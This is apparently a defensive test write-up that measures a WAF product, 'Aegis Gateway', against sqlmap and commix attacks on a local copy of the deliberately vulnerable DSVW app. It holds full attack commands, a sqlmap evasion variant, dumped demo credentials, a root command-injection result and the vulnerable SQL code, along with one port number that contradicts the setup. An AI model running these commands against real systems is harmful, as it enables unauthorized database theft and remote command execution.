# Attacking Aegis with real tools

Everything here ran on one machine against local copies. Only attack systems you own or have written permission to test.

## Setup

```bash
git clone https://github.com/stamparm/DSVW && git clone https://github.com/sqlmapproject/sqlmap
git clone https://github.com/commixproject/commix

# A: unprotected DSVW
python DSVW/dsvw.py --port=5202
# B: another DSVW copy behind Aegis Gateway (gw.toml below)
python DSVW-copy/dsvw.py --port=5203
aegis gateway -c gw.toml --port 8095          # the app is reachable at http://127.0.0.1:8096
```

```toml
# gw.toml
[[app]]
name = "dsvw"
upstream = "http://127.0.0.1:5203"
listen = 8096
source = "DSVW-copy"
shield = "block"
heal = "propose"
# options = { ban_after = 0 }   # B2: switch auto-ban off to measure detection alone
```

## sqlmap

```bash
python sqlmap.py -u "http://127.0.0.1:5202/?id=2" -p id --batch --flush-session -T users -C username,password --dump
```

**A, no protection**

```
Parameter: id (GET)
    Type: boolean-based blind      Payload: id=2 AND 8606=8606
    Type: error-based              (SQLite >= 3.9 JSON path)
    Type: time-based blind         (SQLite > 2.0 heavy query)
    Type: UNION query              Generic UNION query (NULL) - 4 columns
back-end DBMS: SQLite
Table: users [4 entries]
| admin    | 7en8aiDoh! |
| dricci   | 12345      |
| amason   | gandalf    |
| svargas  | phest1945  |
```

**B, behind Aegis Gateway (defaults)**

```
[CRITICAL] all tested parameters do not appear to be injectable.
HTTP error codes detected during run: 403 (Forbidden) - 101 times
```
Gateway: 102 requests, the scanner user-agent and the first injection attempts were blocked, then the client was banned.

**B2, sqlmap evading, auto-ban off**

```bash
python sqlmap.py -u "http://127.0.0.1:8098/?id=2" -p id --batch --flush-session \
  --random-agent --level 3 --risk 2 --tamper=space2comment -T users -C username,password --dump
```
```
[CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS
[WARNING] GET parameter 'id' does not seem to be injectable
HTTP error codes detected during run: 403 (Forbidden) - 1168 times, 500 (Internal Server Error) - 28 times
```

**C, after healing, no shield**

Aegis patched `cursor.execute("... WHERE id=" + params["id"])` to `cursor.execute("... WHERE id=?", (params["id"],))`, the app was restarted, and sqlmap ran straight at the app with nothing in front of it:

```
[WARNING] heuristic (basic) test shows that GET parameter 'id' might not be SQL injectable
[CRITICAL] all tested parameters do not appear to be injectable.
```

## commix

```bash
python commix.py -u "http://127.0.0.1:5202/?domain=www.google.com" --batch --os-cmd="id"
```

- **No protection:** `GET parameter 'domain' appears to be injectable via results-based classic command injection` … `Execution output: 'uid=0(root) gid=0(root) groups=0(root)'`
- **Behind the gateway, auto-ban off:** `It seems some kind of WAF/IPS is protecting the target` … `All tested parameters do not appear to be injectable`. commix notes that some payloads reached the shell and produced errors; none executed.

## What this does and does not show

- It shows the shield stops two widely used attack tools on a real third-party app, including with evasion options, and that the healed code resists sqlmap with no shield at all.
- It is one app and one parameter per tool. It is not a substitute for an independent WAF test (for example against the full sqlmap tamper set or a commercial evaluation).
